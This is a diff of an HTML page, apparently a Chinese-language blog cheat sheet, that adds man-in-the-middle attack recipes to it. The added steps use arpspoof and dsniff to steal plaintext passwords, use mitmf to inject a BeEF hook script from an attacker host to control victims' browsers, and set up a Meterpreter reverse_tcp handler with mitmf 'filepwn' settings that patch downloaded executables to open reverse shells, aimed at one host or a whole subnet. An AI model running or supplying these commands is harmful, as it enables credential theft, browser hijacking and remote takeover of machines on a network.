@@ -121,7 +121,7 @@
 
       <div class="read-time">
         <small>
-          1 minute read
+          2 minute read
         </small>
       </div>
 
@@ -187,13 +187,15 @@ hamster
 </code></pre>
 </div>
 
-<h4 id="0xc-mitmfdsniff">0xc mitmf+dsniff</h4>
+<h4 id="0xc-arpspoofdsniff">0xc arpspoof+dsniff</h4>
 
 <div class="highlighter-rouge"><pre class="highlight"><code>作用:获取明文密码
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t 192.168.1.101 192.168.1.1   欺骗192.168.1.101
+    [arpspoof -i eth0 192.168.1.1    欺骗所有机器]
+dsniff(new terminal)
 
-mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1
-dsniff -i eth0
-    或dsniff -p file.pcap(这里需要中间人欺骗后wireshark抓包)
+类似于cain的效果,但是测试不能截到http表单中的密码
 </code></pre>
 </div>
 
@@ -224,6 +226,60 @@ ettercap -Tqi eth0 -M arp -P dns_spoof /192.168.1.101// ///
 
 msf设置利用ie漏洞或其他浏览器的漏洞
     
+</code></pre>
+</div>
+
+<h4 id="0xf-mitmfbeef">0xf mitmf+beef</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>作用:控制浏览器
+
+mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1 --hsts --inject --js-url http://192.168.1.104:3000/hook.js
+</code></pre>
+</div>
+
+<h4 id="0xg-mitmfmsf">0xg mitmf+msf</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取shell
+
+msfconsole
+use multi/hanlder
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.106
+set lport 4444
+exploit
+
+msfconsole(another terminal)
+load msgrpc Pass=abc123
+如果到这里报错无法连接msfrpc则根据需要修改/etc/mitmf/mitmf.conf中的与msfrpc相关的设置(端口或密码)
+
+vi /etc/mitmf/mitmf.conf
+    eg.相关设置如下
+            [[[[WindowsIntelx86]]]]
+			PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
+			# PATCH_METHOD overwrites PATCH_TYPE, use automatic, replace, or onionduke
+			PATCH_METHOD = automatic
+			HOST = 192.168.0.106
+			PORT = 4444
+			# SHELL for use with automatic PATCH_METHOD
+			SHELL = iat_reverse_tcp_inline_threaded
+			# SUPPLIED_SHELLCODE for use with a user_supplied_shellcode payload
+			SUPPLIED_SHELLCODE = None
+			ZERO_CERT = True
+			# PATCH_DLLs as they come across
+			PATCH_DLL = False
+			# RUNAS_ADMIN will attempt to patch requestedExecutionLevel as highestAvailable
+			RUNAS_ADMIN = False
+			# XP_MODE  - to support XP targets
+			XP_MODE = True
+			# SUPPLIED_BINARY is for use with PATCH_METHOD 'onionduke' DLL/EXE can be x64 and
+			#  with PATCH_METHOD 'replace' use an EXE not DLL
+			SUPPLIED_BINARY = veil_go_payload.exe
+			MSFPAYLOAD = windows/meterpreter/reverse_tcp
+
+mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1 --filepwn(欺骗192.168.1.101)
+    mitmf -i eth0 --spoof --arp --gateway 192.168.1.1 --filepwn(欺骗c段)
+
+
 </code></pre>
 </div>
 </span>
